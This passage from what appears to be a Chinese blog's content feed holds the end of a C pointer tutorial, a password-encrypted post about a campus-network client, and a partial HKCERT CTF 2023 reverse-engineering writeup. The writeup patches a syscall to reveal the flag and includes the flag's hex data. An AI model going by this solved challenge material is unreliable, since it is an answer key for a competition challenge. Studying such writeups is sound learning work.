class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">3</span>; <span class="comment">// 声明并初始化为3一个int类型变量i</span></span><br><span class="line">    <span class="type">int</span> *p; <span class="comment">// 声明一个变量p,其类型为int*,代表它是一个指针</span></span><br><span class="line">    p = &amp;i; <span class="comment">// 将i的地址赋值给p</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,*p); <span class="comment">// 此时对p的值进行*运算,也就是解引用,效果就是将p中的值作为一个</span></span><br><span class="line">    <span class="comment">// 指针,去访问对应的内存,从而取出变量i的值</span></span><br><span class="line">    <span class="comment">// 换句话说,这里的*p和i是等价的.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121011323454.png" alt="image-20231121011323454" style="zoom:50%;" /><p><code>注意:在对一个指针进行解引用时,一定要确保其指向了有效的地址!!!这是一个十分重要的问题!对未正确赋值的指针进行解引用(访问)是十分危险的行为.</code></p><h3 id="指针声明的问题">指针声明的问题</h3><p>我们在声明指针的时候,一定要注意和普通类型进行区分.普通类型与其对应的指针可以在一个声明中出现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p1,a,*p2;</span><br></pre></td></tr></table></figure><p>这里声明了2个<code>int*</code>类型的指针p1和p2,和一个<code>int</code>类型的变量a.</p><p>要注意的是,p2前面仍然需要一个<code>*</code>代表它是一个指针,另外,尽管p1前面已经有了一个<code>*</code>,但是a仍然仅仅是一个<code>int</code>的变量而已.</p><h1 id="解决交换问题">解决交换问题</h1><p>现在我们可以尝试使用指针进行交换两个变量的值.</p><p>我们既然要使用函数交换两个变量,那么就要求函数能够访问到这两个变量,现在,我们可以使用两个指针参数实现.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在函数中使用指针进行交换两个变量的值</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d, b = %d\n&quot;</span>, a, b);</span><br><span class="line">    swap(&amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d, b = %d\n&quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的<code>swap()</code>函数的两个参数不再是两个int类型的参数,而是int *类型的指针,代表着这个指针可以指向一个int变量.</p><p>main()函数中,<code>swap(&amp;a,&amp;b);</code>使用<code>&amp;取地址运算符</code>计算a和b的地址,传递给swap的两个形参.</p><p>接下来,在swap()中使用一个中间变量(temp仍然需要),进行交换,对指针变量使用<code>*</code>进行解引用,获取到两个要交换的int值,然后进行交换即可.</p><p>运行结果如下:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231124172141354.png" alt="image-20231124172141354"></p><br><p>上面的例子我们了解了如下内容:</p><ol><li>如何获取一个地址(取地址运算符)</li><li>如何存储一个地址(指针变量)</li><li>如何使用一个地址去访问内存(解引用运算符)</li></ol><p>接下来探究<code>指针类型</code>.</p><h1 id="指针的类型">指针的类型</h1><h2 id="不同基本类型的指针">不同基本类型的指针</h2><p>前面的例子都是使用了<code>int *</code>这个类型,代表着对应的指针变量(应该)指向的是一个int类型的变量.</p><p>其他类型的变量同理,如果我们需要指向一个float类型的变量,那么就使用<code>float *</code>即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 其他类型的变量同理,如果我们需要指向一个float类型的变量,那么就使用`float *`即可:</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">float</span> var = <span class="number">3.1415</span>;</span><br><span class="line">    <span class="type">float</span> *ptr = &amp;var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;var == %f\n&quot;</span>, var);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用ptr指针就能访问到var.</p><p>此外,指针类型不匹配是不允许的操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此外,指针类型不匹配是不允许的操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> *p = &amp;a;</span><br><span class="line">    <span class="type">char</span> *q = p; <span class="comment">// 这里报错: cannot convert &#x27;int*&#x27; to &#x27;char*&#x27; in initialization</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代表着两个指针不兼容,即一个<code>int *</code>的指针不能赋值给一个<code>char *</code>的指针.</p><h2 id="空类型指针">空类型指针</h2><p>有时候,我们可能仅仅想要存一个地址,而不关心其类型,那么可以使用<code>void *</code>类型,即空类型指针,任何类型的指针都能赋值给<code>void *</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1024</span>;</span><br><span class="line">    <span class="type">void</span> *p = &amp;a; <span class="comment">// &amp;a为指针,其类型为int*,可以直接赋值给void*而无需任何处理</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *(<span class="type">int</span> *)p); <span class="comment">// void*指针不允许直接解引用,必须进行强制类型转换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码使用void*指针p存储了a的地址,在使用p访问a的时候,必须使用<code>强制类型转换</code>将<code>void*</code>转换为<code>int*</code>才能进行解引用.因为对<code>void*</code>解引用的话,无法判断实际占用了多少内存,所以下面的代码编译器报错<code>&quot;不允许使用不完整的类型&quot;</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1024</span>;</span><br><span class="line">    <span class="type">void</span> *p = &amp;a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231124231605327.png" alt="image-20231124231605327" style="zoom:50%;" /><p>这就是一个重要的问题:指针指向的数据类型的大小.</p><p>后面我们会慢慢的接触到<code>void* 指针</code>的重要作用.</p><h2 id="特殊的指针值-null">特殊的指针值-NULL</h2><p>还有的时候,我们希望一个指针变量不指向任何有效的地址,那么我们可以对其赋值为<code>NULL</code>空指针值.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, p);</span><br><span class="line">    <span class="comment">// 实际上, NULL 就是 0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231124232132101.png" alt="image-20231124232132101" style="zoom:50%;" /><p>可以看到,p的值就是0. NULL是一个<code>宏</code>(宏定义),定义在<code>stdio.h</code>中(<code>宏定义</code>将在后面的<code>头文件</code>部分讲解):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdio.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULL ((void *)0)</span></span><br></pre></td></tr></table></figure><p>这个宏意味着<code>NULL</code>在<code>预处理</code>的时候直接替换为<code>((void *)0)</code></p><p>也就是说,当一个指针值为NULL时,我们认为他不指向任何地址,并且认为NULL是安全的—我们检查一个指针是否等于NULL来判断这个指针是否被初始化等…</p><p>后面会深入强调初始化的问题.</p><h2 id="强制类型转换">强制类型转换</h2><p>指针本质上还是一个整数(无符号的),但是<code>指针类型</code>仍然不能和普通的<code>整型</code>互相赋值,如果我们想要将某个数值作为指针值进行赋值,可以使用强制类型转换.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> value=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *)value;</span><br></pre></td></tr></table></figure><p>这样,指针p就指向了<code>0x7fffffff</code>这个内存地址对应的内存单元.</p><p>此外,这里也能看出,<code>int</code>和<code>int*</code>是完全不同的两种类型!</p><br><p>指针是C语言的&quot;灵魂&quot;,指针的内容几乎占有了C语言的半壁江山,本部分简单讲解了指针的基本概念和使用方法,后面会详细展开讲解.</p><br><br><p>上一篇:<a href="../2023-11-01-39a6f8c668c3">C语言教程-12_3-函数的其他用法和特性</a></p><p>下一篇:<a href="../2023-11-26-270f21643ff7">C语言教程-13_2-指针类型与指针运算</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园网某捷客户端强制关闭VMware NAT Service服务的解决办法</title>
      <link href="/2023-11-15-51509ebccc40/"/>
      <url>/2023-11-15-51509ebccc40/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d37e8c3865ddb4ef2e321657d308c90edcbe8944363fd04258d374f5cd1b6401">93c5be1345d8886e9cfff8c6ac59662fb9415c190a575d312e0bba6d4a9959b619e4f2f4682cf8c93b650f372c6a7e7dbc7cc0fd73a8a34532592dbbcb557bcadf1b1887602e65893b572c6011da4700d29eeaf7bb5359b31b295709292953ee74c56b75bb3240db113183e5a089282a549ed5be6879b5719bc1cb62514310cd84a6c4b6ea11d889ea3b6dce6d98d78d97d520f97b347e5513da1bd40f0310f82c66b9c6583803fdf0e47eb9ed792d82149e0607844f8e4a225ce1f3ff3a2c3cb534daa32814a199aab30346991bbc7ff5c809d86d01e86847c4a2edd25c350d514c45dd54a0b390ca181a9498df380e680f60a171ec9c93385249546c47054d29aa5b7a4bf33200696572ced8d501ff5c815d7bb6ed3d278d8ea8461c1780bd5eb1d2fb2eafb1c81bb7bfa72dbeab3cf5732196911a02dc5fe3ff13d117a5b5e98f3893d1dbf03ef7186d72dd0b646616f0b3f9563760a933cbb7225131f7e86497d6939629f61abaf5d430049a06a813f17fdaa345f1715ee78c2ccfbf1366a0d4508022165da923c8865b39e66f084d1d132710a674cf87f547aeeea9c59fe3ba4a3c0f5aa87d04ee1543d8a50c4b4710dde8f546788d26f2a79595897b3959b5d2a58a9db8d664a491b467fdeb34725b03a0f1f858b8c2405db6580329ce7440f0aeb22d4930b1c600e889120bd43422f998f55c8b696bb56d6ee48a8a1190a4076e5d6d97f4a4bbf5adf51938cac6bf023fe5e580e1fd90b9f70f58c802cc0333c67a6d85eb463c017498a941c0565e6783463f8d058d2df13a6fabf74b46f6a3486333966fc927ccf978fc29a36dfd0c055bc789b8c539a3a53bef448b98162eb3c9683a94be1cf082fefea30080885784413d46fbf914b8ee55d5e72c9da4067381f3de6e7b7293aaee88239eabc790bac08ceae8ec28445e3bc6d5af64e63d475664ab585b3f5c25c37669a51cd03042136bdd4749004d2b1fafad9dc20914f7f37ad1acf7d9b958ce405b3a42853c9c37e6202f9d3ea6b6b3e6738fe99653574fdb076fe971427b06e553ac711b321f19715281e094d601a95291c74767de65d6f8f34702b9c1f69e769201023ed88f715d1707956d04f858acd1a45a44511fc369ee674c1cbff34d7ce45a9df46c52ac3463130333c3223df4d81fabc9961ee9eb628f11518f2d19786c121090277e8f43c2a21c4fedcfa1a5af5b9b0e1c02406e8884f6307fee199a35b2b55d272cf0300d1d680c3a5eb52710ec94f735ac013eee2beb0295358a2a4c95cdd5fc1a78fcc18c263b2fabab42bf44e2528fccf7005bb5a5fd542a66110e22783918cf9a3e81a14d1fd0024867d0c5b6db1b092be8608f771d3a0b82915afe1251ff5eca5297592c07ff4412397ac53646bdb90c737a254f34400cf80faed1b3fa2c4c6e70079ae1eef36f4677e557200cb909d7f00237d25e9ff7d6ec73d89c3d596a1ea1adaa4b9566b29d28f90f7cebe2aedac7f4311feec310e548ffc16ff44c71926a3e7918a8c4bc55a13ffdee8382077847c9c50fe82bfcfa9c51f6dff4dbe3723210bef9a92f75ed5046d253f6bb4d25448d40025492fcf4724035f2774e94d929569ec414cd3524edd88baf3648ac93601ff9867b06e187a22d0760b4c8a8c6999b9da3471ab01a477b4dd097dbe78509381acec4e10288f6b4189097f8d32e527f1275a084812c36c696152af3f29cdc123a3afac82ceda969c103c2247d0a31f8710319cca21d8fe745fad2f0c50218be70aae9a8a7b35da19a066a50b6ea9892ba710cdd904ab2c55e27862d73ce4db7dc28ee6b3b8c02654d9760a0773b0e08025a25e4e27acc77b37fa84e2f817f5d42861bd0911e11c623fe9541629dc0c6e726fd4c42f857a0c69605b401650b598cc879a824f0e1ae94a0d80af36235b1ff5ecb64a300f2617ebda99c436b1041e617a26372cc04814a3a218cac611d608b5ab94490453356122f3746a187bd439a321828ede6f8f2fe6ac0c5c9b8cbcf85dceb98db01983853c1d2ca4856b4d0d519655b0f2d6b78a7dfafebdb44ea936f8e4fe672cec0a6fd6ce068283556feab6f6a7941852e26d734da45717ea9624c48166cbd91bd2da2d612fe57e2a29a374e1f74262cdba64451420999510dec74fb5fe708e464aaae7f857af8d9915a946e426683861e702a12d0d70eaba3568915fa77700e6be2995a5cf5cdb05f5135d7e81af2706f9ba776007b42bb60bc73702012fd4952c4e6422682b54fd7aeef24907afa73d3a4187a99231beed292d00584e9bf74357d3149d515ccb54c755bcacbf939a0a256811d6ea363eed3263407b5b210238ca5cdba13df6a6647bfb25e9f5dcc42137aee48abb7c9cd088e323ba562a8ac18b2bedf5b27a2339509119a51b968355c07429417ae319891dedf13bbe0f7a294a408e0573602b863e5e666f30dfebad0eef3ffe5a904cf12e3b0715e5bc3f42caf797b6a9acad6f830f60306be142e0d1c08f055ee20ebdf63a432806af2d017d3dcd64b7093b82fbb914fc4f3f586020f76a68d5c35b6f8960ac7cb4915c3277254f33d18a395c5344821e973093bb534ff753c488e5aaf8fa240f076d06467e1b76101692299e4826d374ec5bb67ca7e570dad4ec13328c628fec224c73539828fcef5ba8c40405c8b2e5a668af7fe5a2633aa4965083ec1c05ec2ee931f34e8482fa84bfd10ad6361c3210cc933032ca5a3b37652ae9501da750e5221573877cc60ecb268acb2db7f949b859343eb9350a8b01678dcc6d7df9256269aba1b41580903f26b4d1dd038abaffa298b454ddd030b461c3ee64ec001f338a95660abdfa62a10315e3cd3c58fc63a33abe098a55f1dcab6519883f384780746c0f6ebba5ebaca75106eb026be5271e7525f7a3844227f1a7a188013bb9507ab517f2814528186375f72f08c2686885f3a46c5b021dd75cb3c5311c3364a5c1db493a2743738a2c726a4d0b42cc6542d6d703223cc581016da757f8255da4d08c588d8da18b0ccfb45160d4aa3f695ce0dcfd2edaa6609ad2dcf3b36648fea3d8af828a4b6f804dfd318a83b20f0904df723acef28154ee23ca06ff907ccf484c07d95f24d0e40d4429e8f9cf351dc8e4d14dd42a455e2806739ac2b06fef5a9016a62cdfeabd5d0378076a5ae702582332fe84b696216cd986b63daa8fd7a9f00cfa1a2ec3f85239486452ac54b1580470ae556d7b738f326dab60cc49f39e54e7258bf5136a83cf2135e6ed2b88eedc0345d3a8a80295b3456cb483e310db50c1e36b02fb37e349d370dc2d94ccffb9a444b20b664e7d977b36d85c69e1f0f58b0f7593d04dc7f4d531c8f2c86308f72c024226efa458174de6caab97dca792e089ea2d28dd1ecc001ff1cd632896e9a863bb22efb37c1b62d4706706c589ef07615de1b111c1807160fa12251cb57a89ad24e2a910788bc9a6138c38723b8be92de51d18e100dc099556e1f31def881c390d72455354ac1113c80fc75c426aeef2c101ab9181adf066caf3979277b62ce6e69877ebe080e2176622cea311039e655a1ae44a22edc90ca13fd0238fa8bf502029f81a59f67ae1a3905ef66b0d47942010951c59f0a1f59b7c4bb30b57e70ad61b54768695cb8de613f016bfba50e697f6eced2329ee4d579177e69b4394917083ead54092b147c7e61c55c19e4b95af4dd3239678134ddccaa8f55ddc12c22c4aebdec9491eecfb3c57ad133ed12acde21b577a37840f7fc21ca8ba523c2c02a0e4b0dbade57b1c1afacb6c430cbeaca4f1faf4606d5d6b40506f19c260a0b37220c0b0fd4086275f21a6aec05c8a960a46fb12b14b3c9728f96d893ecf17c64f4c374acd482217d94f584628205d5084812c1cc6141bd67855f3d052ce1a381aef5ac8bd2ee918e56337a54e4184d9738a28ab20aeeb63fade32fe28b3865087645d916cb965a3c03b2d9b469566493ef60c43560e4f6e6dd455862037b2d30027da4dafcebf54dec63128a01b48ca690d4977905fdf34ee52f2b3c00ba19ff55ddafaad7377d12a20526b09ee9e8b6b1ee6bad7ae0d9e90558f8e01041388628b5135f542c23cfb3b25975a69b73f7dc51a2d86d413f5ec5dd3a45d28bf649ca91bc28dd5a66b4b2bd3beaeeedf51af1a30db2872e5c011d8cac3e6e23d147c02085f7cb3868e26a00a810dfaf545ee3f4d1845a5590ae7d6d3d2301801c49a0a2aa3ba07c847090405150379eba0a98be4542414f89ee919274ea8f0a1cd001c8e5d8e669fce5157a603374eb0e6d593e70567d0eef2de55cba649b83727b2b69717b130966809b3f12aa5eacc09aee39ca0470e9bf3debbc6a559db436f1137eeac566789679e8f0b1ee45af22bef233262acfdcf5b9d85bd8dd39d57e2c194e64d501a2da17801350783a0890a55fcfb95a66f5460608c2c2bf3d93982097fb083f8601ffc41f16e554f79d8ffa4753c6999dbf63f14088d1d0febe319a80967507f4dde265457886ebea9eec51608b5ddc433b0daa39a06669cdb993ffcf52c0151207aad82d6ad4a73c0684756ec8064ab92b2981fa926cf0c97cc0de8c5a5dc59ce508fd31c39616eea4e5b7d4c325f69d7ef6e18c5b612dc4ae8638a3a877e46bf169fc0bb1a1769a09e1a28c41477400b8a4ee8efc32ed53b34fd14d4068ef7485662418ff6ab9aef09fdbbdd213ce8930cd8714086eea9b20739af640e6fe84e4fa1fb3fa6c7fef3be8c7f2697aa1bec72336de20501d0c282f5712172c7cd17de331a85afa203dcca421ce05acd0a8025fba760b31988b6891e162ae3ddb8116dcfcc4284f8c4bc55e8d2d5c2d1495fbf2f5a83b3a86f5fcf9672663e8fb85d57a28bace1e7f2a6c2702ca8a60dd65d84dc7d669e68e5d2cdf3740a26390ba4e118d3470754be0e4a56896ebb529d807b8bcc256c5a617bc3adb57af3ee082063f108a6a9735d8b02afec129f30bcb0bd1822116e6e7bdc4e79d244ee170f28697405d731944e994bf478c6a6deeb60a3f03dcc288d23c5d8a0be732a4abd4e7ce7cfb8da4ed0e87e58645d95c395c33670c10acbfc545348906bd2342535fe9344bec4f9a29777d1f9a687cb1b1f9c5ea36ac445de586d94e7545095d238ed5240c900a7a7d245253b1295b8cb0c1023c2a5b8bd9f7f215927cfbb587fd23cc1f27c4065600865e98747b4e153bb8b7ff70be1f09b3a8296d1ccc7b305da5183283cb0fb0af5e81b6c6a2c6568cd8c299c6424545f9c1abde6ee5e30b10e842ea4d4f8afabbba4935c6859e3f93337cd2f6fda163b038a1991aea173e3d9d3accab87d6fee3c9dcce592d6c61eaa9713d352daebe1b43226d1678aa9d00354f51afa73c3efaf49192483349a06f4a71f5a87e33fb63dc3ab98b1e809596ef27d9cbfda4965aa30660062d0822b30166e4830ca80846e22500900aa1877e8c713d367ce5fa5d7684fc82faf882c99026b8643c2d7663315184f80aa929a8ce60925f2d14bd315dfd9d94a696b855addde66a4602dc000a4a2fd6c3fa2fad6aeeae1db218cc97bec140fca953f97257f7cbee956d7889c4052c5203a4b1e6200ccf04ea12883a17c4ab05f765878e0eebd39d93e37343fcd121d892c4eec0320dbaa780b664b3b609811c7efe3a83d79c34478d2a7e98ebdc80a0bdb27aec3d9c30e522ea2dcb359fccee7dd0d606c4b0513c9738e65203efa754019c8e7a3017989bfa121cea2a5029b6b18515b076e9dda0e4d2d1f9a23fd13c31d0b24acf38893a19d61487ec4d3c8ebc7272b9fa1605b7a904ce5490d0621d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> Ruijie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-HKCERT-CTF2023</title>
      <link href="/2023-11-13-67c4e27d1414/"/>
      <url>/2023-11-13-67c4e27d1414/</url>
      
        <content type="html"><![CDATA[<p>唯一做出来的一道…</p><h1 id="reverse">Reverse</h1><h2 id="isa-intrusion">ISA Intrusion</h2><p>这个题是在线平台,貌似是ARM架构的汇编,同时有其他题的代码,将本题的汇编代码复制到第一个选项去调试分析.</p><p>发现实际上程序对栈底的一段数据进行了3轮循环,每个循环都进行一种变换.</p><p>代码第一次尝试运行,发现并没有以正常的0值返回,而是返回65:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231113235555883.png" alt="image-20231113235555883"></p><p>下断点进行调试发现程序始终在最开头的一个简单的循环运行,最终崩溃(貌似是循环太大了,对这种汇编不是很了解),静态分析发现这个循环可以直接删除:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114000137754.png" alt="image-20231114000137754" style="zoom:50%;" /><p>后面的分析就很简单了,就是压栈4段数据,其中栈底的那一段是密文.</p><p>代码使用另外的3段数据对密文依次进行3次循环,每次循环都进行简单的变换(按位异或,按位与,按位或).</p><p>然后发现程序在最后的4行进行了一个syscall,经过测试(当时因为发现还有其他代码,可能也算是非预期?)发现R8寄存器中存储的是&quot;系统调用号&quot;(ARM也有这个吧大概?),不过和x86,x64不一样.</p><p>这里的2对应<code>exit</code>,1对应<code>write</code>,所以把代码最后的4行换成如下的5行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; MOV R1, 0;</span><br><span class="line">; MOV R8, 2;</span><br><span class="line">; SYSCALL;</span><br><span class="line">; ADD SP, 412;</span><br><span class="line">MOV R1,R4;</span><br><span class="line">MOV R2,200;</span><br><span class="line">MOV R8,1; 1相当于x86的write的系统调用号</span><br><span class="line">SYSCALL;</span><br><span class="line">ADD SP,412;</span><br></pre></td></tr></table></figure><p>这样就能输出栈底的flag(起始地址为<code>0xffffff88</code>):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114001113136.png" alt="image-20231114001113136" style="zoom:50%;" /><p>注意得记得把开头的那个循环删掉.</p><br><p>或者费劲点也可以复制出来手动输出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// export_data.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> ogn[] = <span class="string">&quot;ffffff8865636b68ffffff8c33327472ffffff906d30737bffffff946d317433ffffff9837695f33ffffff9c34655f73ffffffa072336973ffffffa45f30375fffffffa8346e7964ffffffac5f63316dffffffb05f763372ffffffb47435756affffffb87434705fffffffbc6c266863ffffffc05f6b6f30ffffffc46d5f7434ffffffc8726f6d33ffffffcc00007d79&quot;</span>;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ogn); i += <span class="number">8</span>, j += <span class="number">8</span>) &#123;</span><br><span class="line">        i += <span class="number">8</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(str + j, ogn + i, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(str);i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%c%c&quot;</span>,str[i],str[i+<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取出来然后输出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// print_flag.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 